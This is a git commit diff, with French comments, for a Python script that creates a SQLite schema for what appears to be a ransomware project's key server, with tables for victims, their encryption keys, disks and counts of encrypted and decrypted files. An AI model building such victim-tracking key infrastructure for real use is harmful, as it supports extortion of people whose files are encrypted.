0d1c00b66cdc1684fc9703741f7c4b9cb182e83e
StayZeen <salutcmoitchoupi05@gmail.com>
2024-02-05 13:55:28 +0100

    script sql pour le schema de base

--- serveur_cles/create_schema.py
+++ serveur_cles/create_schema.py
@@ -1,14 +1,64 @@
 import os
 import sqlite3
 
-DB_FILENAME = 'data/victims.sqlite'
-SCHEMA_FILENAME = 'script/victims_schema.sql'
+conn = sqlite3.connect('ma_base_de_donnees.db')
 
-db_is_new = not os.path.exists(DB_FILENAME)
+# Création d'un curseur pour exécuter des commandes SQL
+cur = conn.cursor()
 
-with sqlite3.connect(DB_FILENAME) as conn:
-    if db_is_new:
-        print('Creating schema')
-        with open(SCHEMA_FILENAME, 'rt') as f:
-            schema = f.read()
-        conn.executescript(schema)
+# Commande SQL pour créer une table
+create_table_victims = '''
+CREATE TABLE victims (
+    id_victim INTEGER,
+    os VARCHAR,
+    hash VARCHAR PRIMARY KEY,
+    disks VARCHAR,
+    key VARCHAR
+);
+'''
+
+create_table_decrypted = '''
+CREATE TABLE decrypted (
+    id_decrypted INTEGER PRIMARY KEY,
+    id_victim INTEGER,
+    datetime TIMESTAMP,
+    nb_files INTEGER,
+    FOREIGN KEY (id_victim) REFERENCES victims (id_victim)
+
+);
+'''
+
+create_table_states = '''
+CREATE TABLE states (
+    id_state INTEGER PRIMARY KEY,
+    id_victim INTEGER,
+    datetime TIMESTAMP,
+    state VARCHAR,
+    FOREIGN KEY (id_victim) REFERENCES victims (id_victim)
+);
+'''
+
+create_table_encrypted = '''
+CREATE TABLE encrypted (
+    id_encrypted INTEGER PRIMARY KEY,
+    id_victim INTEGER,
+    datetime TIMESTAMP,
+    nb_files INTEGER,
+    FOREIGN KEY (id_victim) REFERENCES victims (id_victim)
+
+);
+'''
+
+# Exécution de la commande SQL pour créer la table
+cur.execute(create_table_victims)
+cur.execute(create_table_decrypted)
+cur.execute(create_table_states)
+cur.execute(create_table_encrypted)
+
+
+
+# Commit pour sauvegarder les changements
+conn.commit()
+
+# Fermeture de la connexion
+conn.close()
